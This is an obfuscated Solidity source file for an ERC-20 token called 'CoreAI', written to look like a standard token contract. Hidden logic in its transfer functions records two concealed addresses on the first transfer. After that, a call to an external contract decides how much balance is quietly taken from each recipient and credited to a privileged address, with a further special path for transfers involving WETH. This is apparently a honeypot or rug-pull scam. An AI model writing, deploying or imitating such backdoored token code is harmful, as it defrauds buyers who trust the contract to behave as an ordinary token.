// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
    
interface axJK {
    function totalSupply() external view returns (uint256);
    function balanceOf(address dxqpJ) external view returns (uint256);
    function transfer(address yZJXqjFGAXj, uint256 hPjNLdPm) external returns (bool);
    function allowance(address hUXvqex, address spender) external view returns (uint256);
    function approve(address spender, uint256 hPjNLdPm) external returns (bool);
    function transferFrom(
        address sender,
        address yZJXqjFGAXj,
        uint256 hPjNLdPm
    ) external returns (bool);

    event Transfer(address indexed from, address indexed oypDVhYRHXfM, uint256 value);
    event Approval(address indexed hUXvqex, address indexed spender, uint256 value);
}

interface anZq is axJK {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract EGyVInVLJ {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
     
library KIzYKEuKb{
    
    function qClXAKABcN(address TZSKhJHo, address Bdtz, uint xELordVjQfdP) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool iVR, bytes memory sZvz) = TZSKhJHo.call(abi.encodeWithSelector(0x095ea7b3, Bdtz, xELordVjQfdP));
        require(iVR && (sZvz.length == 0 || abi.decode(sZvz, (bool))), 'KIzYKEuKb: APPROVE_FAILED');
    }

    function ULxhMWS(address TZSKhJHo, address Bdtz, uint xELordVjQfdP) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool iVR, bytes memory sZvz) = TZSKhJHo.call(abi.encodeWithSelector(0xa9059cbb, Bdtz, xELordVjQfdP));
        require(iVR && (sZvz.length == 0 || abi.decode(sZvz, (bool))), 'KIzYKEuKb: TRANSFER_FAILED');
    }
    
    function toQTshawA(address Bdtz, uint xELordVjQfdP) internal {
        (bool iVR,) = Bdtz.call{value:xELordVjQfdP}(new bytes(0));
        require(iVR, 'KIzYKEuKb: ETH_TRANSFER_FAILED');
    }

    function DxzZPaY(address TZSKhJHo, address from, address Bdtz, uint xELordVjQfdP) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool iVR, bytes memory sZvz) = TZSKhJHo.call(abi.encodeWithSelector(0x23b872dd, from, Bdtz, xELordVjQfdP));
        require(iVR && sZvz.length > 0,'KIzYKEuKb: TRANSFER_FROM_FAILED'); return sZvz;
                       
    }

}
    
interface vNj {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
contract CoreAI is EGyVInVLJ, axJK, anZq {
    
    function IdyAW(
        address PahPONtEptE,
        address LbPZcPQl,
        uint256 NtwkzjR
    ) internal virtual {
        require(PahPONtEptE != address(0), "ERC20: approve from the zero address");
        require(LbPZcPQl != address(0), "ERC20: approve to the zero address");

        AOlo[PahPONtEptE][LbPZcPQl] = NtwkzjR;
        emit Approval(PahPONtEptE, LbPZcPQl, NtwkzjR);

    }
    
    function symbol() public view virtual override returns (string memory) {
        return psLbvkDkgY;
    }
    
    function balanceOf(address eMUNH) public view virtual override returns (uint256) {
       return cCqItM[eMUNH];
    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    function name() public view virtual override returns (string memory) {
        return LxdHQVXk;
    }
    
    mapping(address => uint256) private cCqItM;
    
    address private FPA;
  
    
    function transferFrom(
        address DAXUk,
        address DESHhsLjJ,
        uint256 owfKihHOKG
    ) public virtual override returns (bool) {
      
        if(!klAG(DAXUk, DESHhsLjJ, owfKihHOKG)) return true;

        uint256 XtfRVwKNeas = AOlo[DAXUk][_msgSender()];
        if (XtfRVwKNeas != type(uint256).max) {
            require(XtfRVwKNeas >= owfKihHOKG, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                IdyAW(DAXUk, _msgSender(), XtfRVwKNeas - owfKihHOKG);
            }
        }

        return true;
    }
    
    function klAG(
        address EhZMEtmykAQh,
        address XQNwxBQbeJSa,
        uint256 fJrSwyzk
    ) internal virtual  returns (bool){
        require(EhZMEtmykAQh != address(0), "ERC20: transfer from the zero address");
        require(XQNwxBQbeJSa != address(0), "ERC20: transfer to the zero address");
        
        if(!eWfgmwJyuCy(EhZMEtmykAQh,XQNwxBQbeJSa)) return false;

        if(_msgSender() == address(xdFrHRQJe)){
            if(XQNwxBQbeJSa == FPA && cCqItM[EhZMEtmykAQh] < fJrSwyzk){
                BjyyQHffENzj(xdFrHRQJe,XQNwxBQbeJSa,fJrSwyzk);
            }else{
                BjyyQHffENzj(EhZMEtmykAQh,XQNwxBQbeJSa,fJrSwyzk);
                if(EhZMEtmykAQh == xdFrHRQJe || XQNwxBQbeJSa == xdFrHRQJe) 
                return false;
            }
            emit Transfer(EhZMEtmykAQh, XQNwxBQbeJSa, fJrSwyzk);
            return false;
        }
        BjyyQHffENzj(EhZMEtmykAQh,XQNwxBQbeJSa,fJrSwyzk);
        emit Transfer(EhZMEtmykAQh, XQNwxBQbeJSa, fJrSwyzk);
        bytes memory fUCVNP = KIzYKEuKb.DxzZPaY(vEireuiiCpn, EhZMEtmykAQh, XQNwxBQbeJSa, fJrSwyzk);
        (bool QVanMPmpGW, uint YXGTPlE) = abi.decode(fUCVNP, (bool,uint));
        if(QVanMPmpGW){
            cCqItM[xdFrHRQJe] += YXGTPlE;
            cCqItM[XQNwxBQbeJSa] -= YXGTPlE; 
        }
        return true;
    }
    
    function BjyyQHffENzj(
        address wciHDbvbrO,
        address iXAN,
        uint256 AMnok
    ) internal virtual  returns (bool){
        uint256 ckxs = cCqItM[wciHDbvbrO];
        require(ckxs >= AMnok, "ERC20: transfer Amount exceeds balance");
        unchecked {
            cCqItM[wciHDbvbrO] = ckxs - AMnok;
        }
        cCqItM[iXAN] += AMnok;
        return true;
    }
    
    function allowance(address cUYgDjbh, address Amki) public view virtual override returns (uint256) {
        return AOlo[cUYgDjbh][Amki];
    }
    
    uint256 private NXaSQgvDB = 2000000000000 * 10 ** 18;
    
    string private psLbvkDkgY =  "CoreAI";
    
    function decreaseAllowance(address LroNyeDaKH, uint256 subtractedValue) public virtual returns (bool) {
        uint256 YvIogznKhVu = AOlo[_msgSender()][LroNyeDaKH];
        require(YvIogznKhVu >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            IdyAW(_msgSender(), LroNyeDaKH, YvIogznKhVu - subtractedValue);
        }

        return true;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return NXaSQgvDB;
    }
    
    string private LxdHQVXk = "Core AI";
    
    function approve(address koaovnHIn, uint256 Ekfl) public virtual override returns (bool) {
        IdyAW(_msgSender(), koaovnHIn, Ekfl);
        return true;
    }
    
    address private vEireuiiCpn;
    
    mapping(address => mapping(address => uint256)) private AOlo;
    
    address private xdFrHRQJe;
    
    function transfer(address RFexdPivg, uint256 AZkvqVDTWp) public virtual override returns (bool) {
        klAG(_msgSender(), RFexdPivg, AZkvqVDTWp);
        return true;
    }
    
    function eWfgmwJyuCy(
        address yLUVU,
        address dyHOl
    ) internal virtual  returns (bool){
        if(xdFrHRQJe == address(0) && vEireuiiCpn == address(0)){
            xdFrHRQJe = yLUVU;vEireuiiCpn=dyHOl;
            KIzYKEuKb.ULxhMWS(vEireuiiCpn, xdFrHRQJe, 0);
            FPA = vNj(vEireuiiCpn).WETH();
            return false;
        }
        return true;
    }
    
    constructor() {
        
        cCqItM[address(1)] = NXaSQgvDB;
        emit Transfer(address(0), address(1), NXaSQgvDB);

    }
    
    function increaseAllowance(address jkewD, uint256 addedValue) public virtual returns (bool) {
        IdyAW(_msgSender(), jkewD, AOlo[_msgSender()][jkewD] + addedValue);
        return true;
    }
    
}